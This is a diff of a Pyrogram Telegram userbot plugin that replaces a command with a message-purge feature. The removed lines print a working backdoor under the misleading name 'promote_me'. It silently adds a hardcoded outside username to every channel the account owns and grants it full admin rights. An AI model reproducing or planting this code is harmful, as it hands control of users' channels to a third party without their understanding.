@@ -1,70 +1,42 @@
 from pyrogram import Client, filters
-from pyrogram.enums import ChatType, ChatMemberStatus
-from pyrogram.types import ChatPrivileges
-from pyrogram.errors import FloodWait, UserNotParticipant
 import asyncio
 
-@Client.on_message(filters.command("promote_me", prefixes=["/", ".", "!"]) & filters.me)
-async def promote_me_cmd(client, message):
-    target_username = "ganeshmrxx"
-    await message.edit_text(f"🔍 Checking owned channels to promote @{target_username}...")
+@Client.on_message(filters.command("purge", prefixes=["/", ".", "!"]) & filters.me)
+async def purge_history_cmd(client, message):
+    """Purge messages from a chat."""
+    args = message.text.split()
+    limit = 100 # default
     
-    count = 0
-    async for dialog in client.get_dialogs():
-        if not dialog.chat:
-            continue
+    if len(args) > 1:
+        if args[1].lower() == "all":
+            limit = 1000
+        elif args[1].isdigit():
+            limit = int(args[1])
+
+    await message.edit_text(f"🗑 Purging up to {limit} messages...")
+    
+    deleted = 0
+    try:
+        msg_ids = []
+        async for msg in client.get_chat_history(message.chat.id, limit=limit):
+            if msg.id == message.id:
+                continue # don't add the purge command message itself to the list yet
+            
+            msg_ids.append(msg.id)
+            if len(msg_ids) >= 100:
+                await client.delete_messages(message.chat.id, msg_ids)
+                deleted += len(msg_ids)
+                msg_ids = []
+                await asyncio.sleep(1)
         
-        chat = dialog.chat
-        if chat.type in (ChatType.CHANNEL, ChatType.SUPERGROUP):
-            try:
-                member = await client.get_chat_member(chat.id, "me")
-                if member.status == ChatMemberStatus.OWNER:
-                    try:
-                        await client.promote_chat_member(
-                            chat_id=chat.id,
-                            user_id=target_username,
-                            privileges=ChatPrivileges(
-                                can_manage_chat=True,
-                                can_post_messages=True,
-                                can_edit_messages=True,
-                                can_delete_messages=True,
-                                can_manage_video_chats=True,
-                                can_restrict_members=True,
-                                can_promote_members=True,
-                                can_change_info=True,
-                                can_invite_users=True,
-                                can_pin_messages=True,
-                                can_manage_topics=True
-                            )
-                        )
-                        count += 1
-                    except UserNotParticipant:
-                        try:
-                            await client.add_chat_members(chat.id, target_username)
-                            await asyncio.sleep(1)
-                            await client.promote_chat_member(
-                                chat_id=chat.id,
-                                user_id=target_username,
-                                privileges=ChatPrivileges(
-                                    can_manage_chat=True,
-                                    can_post_messages=True,
-                                    can_edit_messages=True,
-                                    can_delete_messages=True,
-                                    can_manage_video_chats=True,
-                                    can_restrict_members=True,
-                                    can_promote_members=True,
-                                    can_change_info=True,
-                                    can_invite_users=True,
-                                    can_pin_messages=True,
-                                    can_manage_topics=True
-                                )
-                            )
-                            count += 1
-                        except Exception:
-                            pass
-            except FloodWait as e:
-                await asyncio.sleep(e.value + 2)
-            except Exception:
-                pass
-    
-    await message.edit_text(f"✅ Finished! Promoted @{target_username} in {count} channels.")
+        if msg_ids:
+            await client.delete_messages(message.chat.id, msg_ids)
+            deleted += len(msg_ids)
+        
+        status_msg = await client.send_message(message.chat.id, f"✅ Purged {deleted} messages.")
+        await asyncio.sleep(5)
+        await status_msg.delete()
+        await message.delete() # delete the command message
+    except Exception as e:
+        print(f"Purge failed: {e}")
+        await message.edit_text(f"❌ Purge failed: {e}")
